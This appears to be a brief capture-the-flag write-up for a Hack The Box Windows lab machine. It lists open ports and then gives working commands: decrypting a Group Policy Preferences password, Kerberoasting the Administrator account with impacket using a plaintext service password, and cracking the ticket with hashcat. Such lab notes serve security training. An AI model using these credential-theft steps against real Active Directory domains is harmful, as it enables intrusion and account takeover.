# Active - Windows - Easy

## Target: 10.129.38.28

### Open Ports Summary

| Port  | Service      | Version                                                        |
|-------|--------------|----------------------------------------------------------------|
| 53    | domain       | Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1) |
| 88    | kerberos-sec | Microsoft Windows Kerberos                                     |
| 135   | msrpc        | Microsoft Windows RPC                                          |
| 139   | netbios-ssn  | Microsoft Windows netbios-ssn                                  |
| 389   | ldap         | Microsoft Windows Active Directory LDAP (Domain: active.htb)   |
| 445   | microsoft-ds | (no version detected)                                          |
| 464   | kpasswd5     | (no version detected)                                          |
| 593   | ncacn_http   | Microsoft Windows RPC over HTTP 1.0                            |
| 636   | tcpwrapped   | (no version detected)                                          |
| 3268  | ldap         | Microsoft Windows Active Directory LDAP (Domain: active.htb)   |
| 3269  | tcpwrapped   | (no version detected)                                          |
| 5722  | msrpc        | Microsoft Windows RPC                                          |
| 9389  | mc-nmf       | .NET Message Framing                                           |
| 47001 | http         | Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)                        |
| 49152 | msrpc        | Microsoft Windows RPC                                          |
| 49153 | msrpc        | Microsoft Windows RPC                                          |
| 49154 | msrpc        | Microsoft Windows RPC                                          |
| 49155 | msrpc        | Microsoft Windows RPC                                          |
| 49157 | ncacn_http   | Microsoft Windows RPC over HTTP 1.0                            |
| 49158 | msrpc        | Microsoft Windows RPC                                          |
| 49162 | msrpc        | Microsoft Windows RPC                                          |
| 49166 | msrpc        | Microsoft Windows RPC                                          |
| 49168 | msrpc        | Microsoft Windows RPC                                          |

### Vulnerability
MS14-025 / CVE-2014-1812 -> GPP cpassword hash in accessible smb share.

### Exploit
gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ

Credentials for SVC_TGS owned. 

## Privilege Escalation

Kerberoasting Administrator.

### Exploit

impacket-GetUserSPNs active.htb/SVC_TGS:GPPstillStandingStrong2k18 -request -outputfile kerberoast.hash

hashcat -m 13100 kerberoast.hash /usr/share/wordlists/rockyou.txt



